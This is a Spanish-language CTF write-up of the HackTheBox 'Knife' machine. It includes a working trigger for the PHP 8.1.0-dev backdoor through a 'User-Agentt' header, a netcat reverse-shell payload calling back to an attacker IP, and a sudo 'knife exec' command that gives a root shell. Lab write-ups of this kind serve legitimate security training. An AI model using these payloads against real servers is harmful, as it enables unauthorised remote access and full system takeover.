---
layout: post
title:  "HackTheBox - Knife"
author: erik
categories: [ HTB ]
image: https://user-images.githubusercontent.com/47476901/155027848-ef97c64e-42e1-4866-bee6-1372c5ea449d.png
beforetoc: ""
toc: false
tags: [ HTB, GTFOBINS, Linux ]
---
Maquina Linux nivel facil

# Table of Contents
1. [Enumeración](#enumeracion)
2. [Explotación](#explotacion)
3. [Escalación de Privilegios](#escalacion)

---

## Enumeración: <a name="enumeracion"></a>

**Puertos:**
- 22  ssh  OpenSSH 8.2p1
- 80  http  Apache httpd 2.4.41 (Ubuntu)


Analizando la web encontramos una vulnerabilidad en la version del php.
Dicha vulnerabilidad nos permite ejecutar codigo albitrario en el "User Agent"

*VULNERABILIDAD*

- Versión: PHP 8.1.0-dev
- RCE in "User Agent"
- <a href="https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py" target="_blank">Source</a>


Una vez hemos encontrado la vulnerabilidad procedemos a explotarla.
Usaremos BurpSuite y interceptamos una petición normal del servidor a nuestro proxy

Usaremos el User Agent que nos permitirá hacer un RCE en el servidor.

- User-Agentt: zerodiumsystem('id');

![RCE-test](https://user-images.githubusercontent.com/47476901/132779370-39ddc518-e9cb-4474-bb62-5644fc1c5add.png)

## Explotación: <a name="explotacion"></a>

Ya hemos comprobado que funciona, ahora toca explotarla y darnos la reverse a nuestra maquina.

- Usaré la reverse shell de "NetCat"
```
User-Agentt: zerodiumsystem('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.201 1234 >/tmp/f');
```

![RCE-revshell](https://user-images.githubusercontent.com/47476901/132779376-85a24bde-8d38-4a4d-a19c-517e56276839.png)


## Escalación de privilegios: <a name="escalacion"></a>

Flag de user

![user txt](https://user-images.githubusercontent.com/47476901/132779381-b45d0e59-91c5-41da-a544-88b6caeeee9f.png)


Observando que permisos tiene el usuario, nos damos cuenta que puede correr un binario como root.

- /usr/bin/knife

![Binario](https://user-images.githubusercontent.com/47476901/132779384-f4ac9a1b-e287-476f-b1b1-b56a95118219.png)

Mirando como funcionaba este binario en el manual de ayuda encontré algo que llamaba la atención y vi que se podian ejecutar scripts con la extensión "exec"

![Help-exec](https://user-images.githubusercontent.com/47476901/132779390-436fdceb-a41d-4fb5-aa02-ca947e38b506.png)

Ya hemos encontrado algo util y llamativo para ejecutar comandos como root, al poder ejecutar scripts en este binario (que se ejecutan como root) procedemos a implementar un script que nos proporcione una shell 

Usamos el siguiente comando y obtenemos shell de root:
```bash
sudo /usr/bin/knife exec --exec "exec '/bin/bash'"
```

![GettingRoot](https://user-images.githubusercontent.com/47476901/132779395-f6582e92-ca1d-4cd0-8002-18c763338484.png)

Flag de root

![root txt](https://user-images.githubusercontent.com/47476901/132779400-a834c2be-b015-45c9-9879-6593bb8dbe37.png)

**Maquina Completada**
